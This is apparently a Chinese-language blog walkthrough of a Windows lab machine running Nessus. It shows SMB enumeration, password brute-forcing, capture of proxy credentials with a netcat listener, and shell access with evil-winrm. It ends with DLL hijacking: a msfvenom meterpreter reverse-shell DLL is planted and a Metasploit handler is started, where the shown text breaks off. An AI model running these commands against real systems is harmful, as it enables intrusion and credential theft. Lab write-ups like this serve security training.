content=&quot;IE=edge,chrome=1&quot; /&gt;</span><br><span class="line">|_    &lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;upgrade-inse</span><br><span class="line">47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">49664/tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">49665/tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">49666/tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">49667/tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">49668/tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">49669/tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port8834-TCP:V=7.94SVN%T=SSL%I=7%D=7/22%Time=687F7DF3%P=x86_64-pc-linux</span><br><span class="line">SF:-gnu%r(GetRequest,788,&quot;HTTP/1\.1\x20200\x20OK\r\nCache-Control:\x20must</span><br><span class="line">SF:-revalidate\r\nX-Frame-Options:\x20DENY\r\nContent-Type:\x20text/html\r</span><br><span class="line">SF:\nETag:\x20fc785d9fb222132265fb83f9adb1608e\r\nConnection:\x20close\r\n</span><br><span class="line">SF:X-XSS-Protection:\x201;\x20mode=block\r\nServer:\x20NessusWWW\r\nDate:\</span><br><span class="line">SF:x20Wed,\x2023\x20Jul\x202025\x2003:02:58\x20GMT\r\nX-Content-Type-Optio</span><br><span class="line">SF:ns:\x20nosniff\r\nContent-Length:\x201217\r\nContent-Security-Policy:\x</span><br><span class="line">SF:20upgrade-insecure-requests;\x20block-all-mixed-content;\x20form-action</span><br><span class="line">SF:\x20&#x27;self&#x27;;\x20frame-ancestors\x20&#x27;none&#x27;;\x20frame-src\x20https://store</span><br><span class="line">SF:\.tenable\.com;\x20default-src\x20&#x27;self&#x27;;\x20connect-src\x20&#x27;self&#x27;\x20w</span><br><span class="line">SF:ww\.tenable\.com;\x20script-src\x20&#x27;self&#x27;\x20www\.tenable\.com;\x20img-</span><br><span class="line">SF:src\x20&#x27;self&#x27;\x20data:;\x20style-src\x20&#x27;self&#x27;\x20www\.tenable\.com;\x2</span><br><span class="line">SF:0object-src\x20&#x27;none&#x27;;\x20base-uri\x20&#x27;self&#x27;;\r\nStrict-Transport-Secur</span><br><span class="line">SF:ity:\x20max-age=31536000\r\nExpect-CT:\x20max-age=0\r\n\r\n&lt;!doctype\x2</span><br><span class="line">SF:0html&gt;\n&lt;html\x20lang=\&quot;en\&quot;&gt;\n\x20\x20\x20\x20&lt;head&gt;\n\x20\x20\x20\x20</span><br><span class="line">SF:\x20\x20\x20\x20&lt;meta\x20http-equiv=\&quot;X-UA-Compatible\&quot;\x20content=\&quot;IE</span><br><span class="line">SF:=edge,chrome=1\&quot;\x20/&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;meta\x20http-e</span><br><span class="line">SF:quiv=\&quot;Content-Security-Policy\&quot;\x20content=\&quot;upgrade-inse&quot;);</span><br><span class="line">MAC Address: 08:00:27:C0:51:50 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">|_nbstat: NetBIOS name: NESSUS, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:c0:51:50 (Oracle VirtualBox virtual NIC)</span><br><span class="line">|_clock-skew: 14h59m58s</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2025-07-23T03:04:44</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 175.58 seconds</span><br><span class="line">                                                                        </span><br></pre></td></tr></table></figure><p>有一个登陆页面https访问</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250721211236861.png" alt="image-20250721211236861"></p><p>扫目录的时候加上参数-k告诉它忽略 SSL&#x2F;TLS 证书的验证错误。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gobuster dir -u https://192.168.56.156:8834 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .php,.html,.txt,.xml -k</span><br></pre></td></tr></table></figure><p>去看一下smb服务有什么突破点</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# smbclient -L \\192.168.56.156 -N </span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">        ADMIN$          Disk      Remote Admin</span><br><span class="line">        C$              Disk      Default share</span><br><span class="line">        Documents       Disk      </span><br><span class="line">        IPC$            IPC       Remote IPC</span><br><span class="line">Reconnecting with SMB1 for workgroup listing.</span><br><span class="line">do_connect: Connection to 192.168.56.156 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)</span><br><span class="line">Unable to connect with SMB1 -- no workgroup available</span><br><span class="line">                                                                                                             </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# smbclient \\\\192.168.56.156\\Documents -N</span><br><span class="line">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="line">smb: \&gt; dir</span><br><span class="line">  .                                  DR        0  Fri Oct 18 20:42:53 2024</span><br><span class="line">  ..                                  D        0  Sat Oct 19 01:08:23 2024</span><br><span class="line">  desktop.ini                       AHS      402  Sat Jun 15 13:54:33 2024</span><br><span class="line">  My Basic Network Scan_hwhm7q.pdf      A   122006  Fri Oct 18 18:19:59 2024</span><br><span class="line">  My Music                        DHSrn        0  Sat Jun 15 13:54:27 2024</span><br><span class="line">  My Pictures                     DHSrn        0  Sat Jun 15 13:54:27 2024</span><br><span class="line">  My Videos                       DHSrn        0  Sat Jun 15 13:54:27 2024</span><br><span class="line">  Web Application Tests_f6jg9t.pdf      A   136025  Fri Oct 18 18:20:14 2024</span><br><span class="line"></span><br><span class="line">                12942591 blocks of size 4096. 10994381 blocks available</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以直接匿名访问</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">smb: \&gt; mget *</span><br><span class="line">Get file desktop.ini? y</span><br><span class="line">getting file \desktop.ini of size 402 as desktop.ini (23.1 KiloBytes/sec) (average 23.1 KiloBytes/sec)</span><br><span class="line">Get file My Basic Network Scan_hwhm7q.pdf? y</span><br><span class="line">getting file \My Basic Network Scan_hwhm7q.pdf of size 122006 as My Basic Network Scan_hwhm7q.pdf (2382.9 KiloBytes/sec) (average 1784.2 KiloBytes/sec)</span><br><span class="line">Get file Web Application Tests_f6jg9t.pdf? y</span><br><span class="line">getting file \Web Application Tests_f6jg9t.pdf of size 136025 as Web Application Tests_f6jg9t.pdf (2711.0 KiloBytes/sec) (average 2175.7 KiloBytes/sec)</span><br><span class="line">smb: \&gt; </span><br></pre></td></tr></table></figure><p>两个pdf是nessus的扫描报告</p><p>但是作者说过不打cve我们看一下pdf有什么隐藏信息</p><p>使用exiftool来读取文件元信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/bachang/win/nessus]</span><br><span class="line">└─# exiftool *                  </span><br><span class="line">======== desktop.ini</span><br><span class="line">ExifTool Version Number         : 12.76</span><br><span class="line">File Name                       : desktop.ini</span><br><span class="line">Directory                       : .</span><br><span class="line">File Size                       : 402 bytes</span><br><span class="line">File Modification Date/Time     : 2025:07:21 21:31:27-04:00</span><br><span class="line">File Access Date/Time           : 2025:07:21 21:32:50-04:00</span><br><span class="line">File Inode Change Date/Time     : 2025:07:21 21:31:27-04:00</span><br><span class="line">File Permissions                : -rw-r--r--</span><br><span class="line">File Type                       : TXT</span><br><span class="line">File Type Extension             : txt</span><br><span class="line">MIME Type                       : text/plain</span><br><span class="line">MIME Encoding                   : utf-16le</span><br><span class="line">Byte Order Mark                 : Yes</span><br><span class="line">Newlines                        : Windows CRLF</span><br><span class="line">======== My Basic Network Scan_hwhm7q.pdf</span><br><span class="line">ExifTool Version Number         : 12.76</span><br><span class="line">File Name                       : My Basic Network Scan_hwhm7q.pdf</span><br><span class="line">Directory                       : .</span><br><span class="line">File Size                       : 122 kB</span><br><span class="line">File Modification Date/Time     : 2025:07:21 21:31:29-04:00</span><br><span class="line">File Access Date/Time           : 2025:07:21 21:33:22-04:00</span><br><span class="line">File Inode Change Date/Time     : 2025:07:21 21:31:29-04:00</span><br><span class="line">File Permissions                : -rw-r--r--</span><br><span class="line">File Type                       : PDF</span><br><span class="line">File Type Extension             : pdf</span><br><span class="line">MIME Type                       : application/pdf</span><br><span class="line">Linearized                      : No</span><br><span class="line">Page Count                      : 5</span><br><span class="line">Profile CMM Type                : Little CMS</span><br><span class="line">Profile Version                 : 2.3.0</span><br><span class="line">Profile Class                   : Display Device Profile</span><br><span class="line">Color Space Data                : RGB</span><br><span class="line">Profile Connection Space        : XYZ</span><br><span class="line">Profile Date Time               : 2004:08:13 12:18:06</span><br><span class="line">Profile File Signature          : acsp</span><br><span class="line">Primary Platform                : Microsoft Corporation</span><br><span class="line">CMM Flags                       : Not Embedded, Independent</span><br><span class="line">Device Manufacturer             : Little CMS</span><br><span class="line">Device Model                    : </span><br><span class="line">Device Attributes               : Reflective, Glossy, Positive, Color</span><br><span class="line">Rendering Intent                : Perceptual</span><br><span class="line">Connection Space Illuminant     : 0.9642 1 0.82491</span><br><span class="line">Profile Creator                 : Little CMS</span><br><span class="line">Profile ID                      : 7fb30d688bf82d32a0e748daf3dba95d</span><br><span class="line">Device Mfg Desc                 : lcms generated</span><br><span class="line">Profile Description             : sRGB</span><br><span class="line">Device Model Desc               : sRGB</span><br><span class="line">Media White Point               : 0.95015 1 1.08826</span><br><span class="line">Red Matrix Column               : 0.43585 0.22238 0.01392</span><br><span class="line">Blue Matrix Column              : 0.14302 0.06059 0.71384</span><br><span class="line">Green Matrix Column             : 0.38533 0.71704 0.09714</span><br><span class="line">Red Tone Reproduction Curve     : (Binary data 2060 bytes, use -b option to extract)</span><br><span class="line">Green Tone Reproduction Curve   : (Binary data 2060 bytes, use -b option to extract)</span><br><span class="line">Blue Tone Reproduction Curve    : (Binary data 2060 bytes, use -b option to extract)</span><br><span class="line">Chromaticity Channels           : 3</span><br><span class="line">Chromaticity Colorant           : Unknown</span><br><span class="line">Chromaticity Channel 1          : 0.64 0.33</span><br><span class="line">Chromaticity Channel 2          : 0.3 0.60001</span><br><span class="line">Chromaticity Channel 3          : 0.14999 0.06</span><br><span class="line">Profile Copyright               : no copyright, use freely</span><br><span class="line">XMP Toolkit                     : Image::ExifTool 12.76</span><br><span class="line">Date                            : 2024:10:18 15:10:05+02:00</span><br><span class="line">Format                          : application/pdf</span><br><span class="line">Language                        : x-unknown</span><br><span class="line">Author                          : Jose</span><br><span class="line">PDF Version                     : 1.4</span><br><span class="line">Producer                        : Apache FOP Version 2.8</span><br><span class="line">Create Date                     : 2024:10:18 15:10:05+02:00</span><br><span class="line">Creator Tool                    : Apache FOP Version 2.8</span><br><span class="line">Metadata Date                   : 2024:10:18 15:10:05+02:00</span><br><span class="line">Page Mode                       : UseOutlines</span><br><span class="line">Creator                         : Apache FOP Version 2.8</span><br><span class="line">======== Web Application Tests_f6jg9t.pdf</span><br><span class="line">ExifTool Version Number         : 12.76</span><br><span class="line">File Name                       : Web Application Tests_f6jg9t.pdf</span><br><span class="line">Directory                       : .</span><br><span class="line">File Size                       : 136 kB</span><br><span class="line">File Modification Date/Time     : 2025:07:21 21:31:30-04:00</span><br><span class="line">File Access Date/Time           : 2025:07:21 21:33:23-04:00</span><br><span class="line">File Inode Change Date/Time     : 2025:07:21 21:31:30-04:00</span><br><span class="line">File Permissions                : -rw-r--r--</span><br><span class="line">File Type                       : PDF</span><br><span class="line">File Type Extension             : pdf</span><br><span class="line">MIME Type                       : application/pdf</span><br><span class="line">Linearized                      : No</span><br><span class="line">Page Count                      : 6</span><br><span class="line">Profile CMM Type                : Little CMS</span><br><span class="line">Profile Version                 : 2.3.0</span><br><span class="line">Profile Class                   : Display Device Profile</span><br><span class="line">Color Space Data                : RGB</span><br><span class="line">Profile Connection Space        : XYZ</span><br><span class="line">Profile Date Time               : 2004:08:13 12:18:06</span><br><span class="line">Profile File Signature          : acsp</span><br><span class="line">Primary Platform                : Microsoft Corporation</span><br><span class="line">CMM Flags                       : Not Embedded, Independent</span><br><span class="line">Device Manufacturer             : Little CMS</span><br><span class="line">Device Model                    : </span><br><span class="line">Device Attributes               : Reflective, Glossy, Positive, Color</span><br><span class="line">Rendering Intent                : Perceptual</span><br><span class="line">Connection Space Illuminant     : 0.9642 1 0.82491</span><br><span class="line">Profile Creator                 : Little CMS</span><br><span class="line">Profile ID                      : 7fb30d688bf82d32a0e748daf3dba95d</span><br><span class="line">Device Mfg Desc                 : lcms generated</span><br><span class="line">Profile Description             : sRGB</span><br><span class="line">Device Model Desc               : sRGB</span><br><span class="line">Media White Point               : 0.95015 1 1.08826</span><br><span class="line">Red Matrix Column               : 0.43585 0.22238 0.01392</span><br><span class="line">Blue Matrix Column              : 0.14302 0.06059 0.71384</span><br><span class="line">Green Matrix Column             : 0.38533 0.71704 0.09714</span><br><span class="line">Red Tone Reproduction Curve     : (Binary data 2060 bytes, use -b option to extract)</span><br><span class="line">Green Tone Reproduction Curve   : (Binary data 2060 bytes, use -b option to extract)</span><br><span class="line">Blue Tone Reproduction Curve    : (Binary data 2060 bytes, use -b option to extract)</span><br><span class="line">Chromaticity Channels           : 3</span><br><span class="line">Chromaticity Colorant           : Unknown</span><br><span class="line">Chromaticity Channel 1          : 0.64 0.33</span><br><span class="line">Chromaticity Channel 2          : 0.3 0.60001</span><br><span class="line">Chromaticity Channel 3          : 0.14999 0.06</span><br><span class="line">Profile Copyright               : no copyright, use freely</span><br><span class="line">XMP Toolkit                     : Image::ExifTool 12.76</span><br><span class="line">Date                            : 2024:10:18 15:10:19+02:00</span><br><span class="line">Format                          : application/pdf</span><br><span class="line">Language                        : x-unknown</span><br><span class="line">Author                          : Jose</span><br><span class="line">PDF Version                     : 1.4</span><br><span class="line">Producer                        : Apache FOP Version 2.8</span><br><span class="line">Create Date                     : 2024:10:18 15:10:19+02:00</span><br><span class="line">Creator Tool                    : Apache FOP Version 2.8</span><br><span class="line">Metadata Date                   : 2024:10:18 15:10:19+02:00</span><br><span class="line">Page Mode                       : UseOutlines</span><br><span class="line">Creator                         : Apache FOP Version 2.8</span><br><span class="line">    3 image files read                                                        </span><br></pre></td></tr></table></figure><p>里面有</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Author                          : Jose</span><br></pre></td></tr></table></figure><p>直接作为用户名开始爆破</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250722162021100.png" alt="image-20250722162021100"></p><p>得到密码为tequiero</p><p>登录之后发现</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250722180735188.png" alt="image-20250722180735188"></p><p>密码看不到</p><p>但是我们可以将代理服务器改为我们的kali</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nc -lvnp 4444                   </span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [192.168.56.103] from (UNKNOWN) [192.168.56.156] 49742</span><br><span class="line">CONNECT plugins.nessus.org:443 HTTP/1.1</span><br><span class="line">Proxy-Authorization: Basic bmVzdXM6WiNKdVhIJHBoLTt2QCxYJm1WKQ==</span><br><span class="line">Host: plugins.nessus.org</span><br><span class="line">Connection: keep-Alive</span><br><span class="line">User-Agent: Nessus/10.7.3</span><br><span class="line">Content-Length: 0</span><br><span class="line">Proxy-Connection: Keep-Alive</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这样就得到了密码的base64</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250722180922066.png" alt="image-20250722180922066"></p><p>但是没有开启ssh和远程登录端口我们去尝试smb</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# crackmapexec smb 192.168.56.156 -u &#x27;nesus&#x27; -p &#x27;Z#JuXH$ph-;v@,X&amp;mV)&#x27; --shares</span><br><span class="line">SMB         192.168.56.156  445    NESSUS           [*] Windows Server 2022 Build 20348 x64 (name:NESSUS) (domain:Nessus) (signing:False) (SMBv1:False)</span><br><span class="line">SMB         192.168.56.156  445    NESSUS           [-] Nessus\nesus:Z#JuXH$ph-;v@,X&amp;mV) STATUS_PASSWORD_EXPIRED </span><br></pre></td></tr></table></figure><p>就是单纯的密码过期了</p><p>去重置一下就好了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# crackmapexec smb 192.168.56.156 -u &#x27;&#x27; -p &#x27;&#x27; --shares</span><br><span class="line">SMB         192.168.56.156  445    NESSUS           [*] Windows Server 2022 Build 20348 x64 (name:NESSUS) (domain:Nessus) (signing:False) (SMBv1:False)</span><br><span class="line">SMB         192.168.56.156  445    NESSUS           [-] Nessus\: STATUS_ACCESS_DENIED </span><br><span class="line">SMB         192.168.56.156  445    NESSUS           [-] Error enumerating shares: Error occurs while reading from remote(104)</span><br><span class="line">                                                                                                                                                                                                          </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# crackmapexec smb 192.168.56.156 -u &#x27;anonymous&#x27; -p &#x27;&#x27; --shares</span><br><span class="line">SMB         192.168.56.156  445    NESSUS           [*] Windows Server 2022 Build 20348 x64 (name:NESSUS) (domain:Nessus) (signing:False) (SMBv1:False)</span><br><span class="line">SMB         192.168.56.156  445    NESSUS           [+] Nessus\anonymous: </span><br><span class="line">SMB         192.168.56.156  445    NESSUS           [+] Enumerated shares</span><br><span class="line">SMB         192.168.56.156  445    NESSUS           Share           Permissions     Remark</span><br><span class="line">SMB         192.168.56.156  445    NESSUS           -----           -----------     ------</span><br><span class="line">SMB         192.168.56.156  445    NESSUS           ADMIN$                          Remote Admin</span><br><span class="line">SMB         192.168.56.156  445    NESSUS           C$                              Default share</span><br><span class="line">SMB         192.168.56.156  445    NESSUS           Documents       READ,WRITE      </span><br><span class="line">SMB         192.168.56.156  445    NESSUS           IPC$            READ            Remote IPC</span><br><span class="line">     </span><br></pre></td></tr></table></figure><p>没有什么特别的权限</p><p>去evil-winrm拿shell,开放的有5985端口</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# evil-winrm -i 192.168.56.156 -u nesus -p &#x27;123456&#x27;</span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.7</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#x27; for module Reline</span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\nesus\Documents&gt; dir</span><br><span class="line">*Evil-WinRM* PS C:\Users\nesus\Documents&gt; ls</span><br><span class="line">*Evil-WinRM* PS C:\Users\nesus\Documents&gt; cd ..</span><br><span class="line">*Evil-WinRM* PS C:\Users\nesus&gt; ls</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\nesus</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">d-r---         7/22/2025   6:22 PM                3D Objects</span><br><span class="line">d-r---         7/22/2025   6:22 PM                Contacts</span><br><span class="line">d-r---         7/22/2025   6:22 PM                Desktop</span><br><span class="line">d-r---         7/22/2025   6:22 PM                Documents</span><br><span class="line">d-r---         7/22/2025   6:22 PM                Downloads</span><br><span class="line">d-r---         7/22/2025   6:22 PM                Favorites</span><br><span class="line">d-r---         7/22/2025   6:22 PM                Links</span><br><span class="line">d-r---         7/22/2025   6:22 PM                Music</span><br><span class="line">d-r---         7/22/2025   6:22 PM                Pictures</span><br><span class="line">d-r---         7/22/2025   6:22 PM                Saved Games</span><br><span class="line">d-r---         7/22/2025   6:22 PM                Searches</span><br><span class="line">d-r---         7/22/2025   6:22 PM                Videos</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\nesus&gt; cd Desktop</span><br><span class="line">*Evil-WinRM* PS C:\Users\nesus\Desktop&gt; ls</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\nesus\Desktop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">-a----        10/18/2024   1:41 PM             33 user.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\nesus\Desktop&gt; cat user.txt</span><br><span class="line">72113f41d43e88eb5d67f732668bc3d1</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>传上去一个winPEAS进行扫描\</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\nesus\Documents&gt; upload winPEAS.exe winPEAS.exe</span><br><span class="line">                                        </span><br><span class="line">Info: Uploading /myift/peas/winPEAS.exe to C:\Users\nesus\Documents\winPEAS.exe</span><br><span class="line">                                        </span><br><span class="line">Data: 13333844 bytes of 13333844 bytes copied</span><br><span class="line">                                        </span><br><span class="line">Info: Upload successful!</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\nesus\Documents&gt; .\winPEAS.exe</span><br><span class="line"> [!] If you want to run the file analysis checks (search sensitive information in files), you need to specify the &#x27;fileanalysis&#x27; or &#x27;all&#x27; argument. Note that this search might take several minutes. For help, run winpeass.exe --help                                                                                                                                                                                             </span><br><span class="line">ANSI color bit for Windows is not set. If you are executing this from a Windows terminal inside the host you should run &#x27;REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1&#x27; and then start a new CMD</span><br><span class="line">Long paths are disabled, so the maximum length of a path supported is 260 chars (this may cause false negatives when looking for files). If you are admin, you can enable it with &#x27;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v VirtualTerminalLevel /t REG_DWORD /d 1&#x27; and then start a new CMD</span><br><span class="line"></span><br><span class="line">               ((((((((((((((((((((((((((((((((                                                                                                                                                                   </span><br><span class="line">        (((((((((((((((((((((((((((((((((((((((((((                                                                                                                                                               </span><br><span class="line">      ((((((((((((((**********/##########(((((((((((((                                                                                                                                                            </span><br><span class="line">    ((((((((((((********************/#######(((((((((((                                                                                                                                                           </span><br><span class="line">    ((((((((******************/@@@@@/****######((((((((((                                                                                                                                                         </span><br><span class="line">    ((((((********************@@@@@@@@@@/***,####((((((((((                                                                                                                                                       </span><br><span class="line">    (((((********************/@@@@@%@@@@/********##(((((((((                                                                                                                                                      </span><br><span class="line">    (((############*********/%@@@@@@@@@/************((((((((                                                                                                                                                      </span><br><span class="line">    ((##################(/**</span><br></pre></td></tr></table></figure><p>…</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">=================================================================================================                                                                                                              </span><br><span class="line"></span><br><span class="line">   Tenable Nessus(Tenable, Inc. - Tenable Nessus)[&quot;C:\Program Files\Tenable\Nessus\nessus-service.exe&quot;] - Autoload</span><br><span class="line">   File Permissions: nesus [AllAccess]</span><br><span class="line">   Possible DLL Hijacking in binary folder: C:\Program Files\Tenable\Nessus (nesus [AllAccess])</span><br><span class="line">   Tenable Nessus Network Security Scanner</span><br><span class="line">  =================================================================================================                   </span><br></pre></td></tr></table></figure><p>这里给出目标系统上安装了 <strong>Tenable Nessus 漏洞扫描器</strong></p><p>并且当前用户 <code>nesus</code> 对 <code>nessus-service.exe</code> 这个服务文件<strong>拥有 <code>AllAccess</code> (完全控制) 权限</strong>。</p><p>明确指出在 <code>C:\Program Files\Tenable\Nessus</code> 这个 Nessus 的安装目录中存在<strong>可能的 DLL 劫持漏洞</strong>。</p><p>我们进行尝试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Program Files\Tenable\Nessus&gt; ls</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Program Files\Tenable\Nessus</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">-a----        10/18/2024  10:35 AM              1 .winperms</span><br><span class="line">-a----          5/9/2024  11:30 PM        2471544 fips.dll</span><br><span class="line">-a----          5/9/2024  11:30 PM        5217912 icudt73.dll</span><br><span class="line">-a----          5/9/2024  11:30 PM        1575032 icuuc73.dll</span><br><span class="line">-a----          5/9/2024  11:30 PM        4988536 legacy.dll</span><br><span class="line">-a----          5/9/2024  11:06 PM         375266 License.rtf</span><br><span class="line">-a----          5/9/2024  11:37 PM       11204728 nasl.exe</span><br><span class="line">-a----          5/9/2024  11:31 PM         264824 ndbg.exe</span><br><span class="line">-a----          5/9/2024  11:06 PM             46 Nessus Web Client.url</span><br><span class="line">-a----          5/9/2024  11:33 PM          38520 nessus-service.exe</span><br><span class="line">-a----          5/9/2024  11:37 PM       11143800 nessuscli.exe</span><br><span class="line">-a----          5/9/2024  11:38 PM       11925624 nessusd.exe</span><br><span class="line">-a----         7/22/2025   9:29 PM              0 version.dll</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>创建恶意dll</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/bachang/win/nessus]</span><br><span class="line">└─# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.103 LPORT=4445 -f dll -o version.dll     </span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 354 bytes</span><br><span class="line">Final size of dll file: 9216 bytes</span><br><span class="line">Saved as: version.dll</span><br><span class="line">                                     </span><br></pre></td></tr></table></figure><p>上传恶意dll</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\nesus\Documents&gt; upload version.dll &quot;C:\Program Files\Tenable\Nessus\version.dll&quot;</span><br><span class="line">                                        </span><br><span class="line">Info: Uploading /myift/bachang/win/nessus/version.dll to C:\Program Files\Tenable\Nessus\version.dll</span><br><span class="line">                                        </span><br><span class="line">Data: 12288 bytes of 12288 bytes copied</span><br><span class="line">                                        </span><br><span class="line">Info: Upload successful!</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>开启监听</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─# msfconsole</span><br><span class="line">Metasploit tip: Use sessions -1 to interact with the last opened session</span><br><span class="line">                                                  </span><br><span class="line"></span><br><span class="line">      .:okOOOkdc&#x27;           &#x27;cdkOOOko:.</span><br><span class="line">    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.</span><br><span class="line">   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:</span><br><span class="line">  &#x27;OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO&#x27;</span><br><span class="line">  oOOOOOOOO.MMMM.oOOOOoOOOOl.MMMM,OOOOOOOOo</span><br><span class="line">  dOOOOOOOO.MMMMMM.cOOOOOc.MMMMMM,OOOOOOOOx</span><br><span class="line">  lOOOOOOOO.MMMMMMMMM;d;MMMMMMMMM,OOOOOOOOl</span><br><span class="line">  .OOOOOOOO.MMM.;MMMMMMMMMMM;MMMM,OOOOOOOO.</span><br><span class="line">   cOOOOOOO.MMM.OOc.MMMMM&#x27;oOO.MMM,OOOOOOOc</span><br><span class="line">    oOOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOOo</span><br><span class="line">     lOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOl</span><br><span class="line">      ;OOOO&#x27;MMM.OOOO.MMM:OOOO.MMM;OOOO;</span><br><span class="line">       .dOOo&#x27;WM.OOOOocccxOOOO.MX&#x27;xOOd.</span><br><span class="line">         ,kOl&#x27;M.OOOOOOOOOOOOO.M&#x27;dOk,</span><br><span class="line">           :kk;.OOOOOOOOOOOOO.;Ok:</span><br><span class="line">             ;kOOOOOOOOOOOOOOOk:</span><br><span class="line">               ,xOOOOOOOOOOOx,</span><br><span class="line">                 .lOOOOOOOl.</span><br><span class="line">                    ,dOd,</span><br><span class="line">                      .</span><br><span class="line"></span><br><span class="line">       =[ metasploit v6.4.50-dev                          ]</span><br><span class="line">+ -- --=[ 2496 exploits - 1283 auxiliary - 431 post       ]</span><br><span class="line">+ -- --=[ 1610 payloads - 49 encoders - 13 nops           ]</span><br><span class="line">+ -- --=[ 9 evasion                                       ]</span><br><span class="line"></span><br><span class="line">Metasploit Documentation: https://docs.metasploit.com/</span><br><span class="line"></span><br><span class="line">^[[A^[[</span><br><span class="line">msf6 &gt; use exploit/multi/handler</span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line">PAYLOAD 